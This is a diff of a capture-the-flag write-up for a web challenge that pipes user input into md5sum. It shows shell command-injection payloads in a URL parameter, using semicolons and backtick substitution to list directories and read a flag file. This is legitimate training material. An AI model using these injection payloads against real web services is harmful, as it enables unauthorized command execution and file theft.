@@ -25,30 +25,59 @@ echoing the string into a pipe seems like the most obvious to me so I will do my
 
 I used [Postman](https://www.getpostman.com/downloads/) to craft and send my requests but anything will work, even typing directly into the address bar.
 
-a';cat flag.txt <-- No response
-a;cat flag.txt <-- a\n <hash of 'cat flag.txt'>
+A request should look like the following:
+```
+http://webchal.hax.works:1234/4efbc763384086cd91ce2c898110fd8d/index.php?string=hash+me%21
+```
 
-So closing the string breaks the script,
-we are echoing 'a' and the rest is being passed into md5sum
-To me, the command runs on the server like:
-    echo <input> | md5sum
+For the remainder of the writeup, I will remove everything up to `string=`
+
+I started by looking fuzzing for an exploit like follows:
+```HTML
+string=a';cat flag.txt
+string=a;cat flag.txt 
+```
+
+Very quickly, we can tell that passing a `'` breaks the script and the second query returns:
+```
+    a
+d41d8cd98f00b204e9800998ecf8427e  -
+```
+
+Whats happening is that `a` is being echoed and the string `cat flag.txt` is being passed to the md5sum command.
+This commands that the server runs the command as:
+```Bash
+echo <input> | md5sum
+```
 
 So how can we exploit that?
-a;cat flag.txt;echo a <-- only give'a' and the hash of 'a'. Completely skips the cat flag command
+```string=a;cat flag.txt;echo a``` 
 
 The reason for the <cmd>;echo a is because we need to:
-finish the echo command first
-Run our command
-and finally feed some input (not the output of our command) into md5sum so we just send garbage data
+1. finish the echo command first
+2. Run our command
+3. feed some input (that is **not** the output of our command) into the md5 function
 
-Lets try just a normal command rather than reading a filename
-`ls`;echo a <-- Now we're getting something!
-The `` tell bash to evaluate whats between the ticks and feed the output to echo
-We see Cerulean_Cave so lets enumerate
-`ls Cerulean_Cave`;echo a
-RESULT: MewTwo.txt
+So the output gives us a blank line where the `cat flag.txt` output should go.
+Lets try just a normal command rather than reading the flag:
+```Bash
+string=a;echo `ls`;echo a
+```
+The \`\` tell bash to evaluate whats between the ticks and feed the output to `echo`
 
-Cool! lets read it!
+The response works and we can see:
+```
+a
+Cerulean_Cave index.php
+60b725f10c9c85c70d97880dfe8191b3  -
+```
+Now we can make our command more consice by removing the `a;echo` part. We also need to enumerate the `Cerulean_Cave` directory:
+```
+string=`ls Cerulean_Cave`;echo a
+```
+There is a text file that we can now read out
 
 SOLVE:
-`cat Cerulean_Cave/MewTwo.txt`;echo a
+```HTML
+string=`cat Cerulean_Cave/MewTwo.txt`;echo a
+```
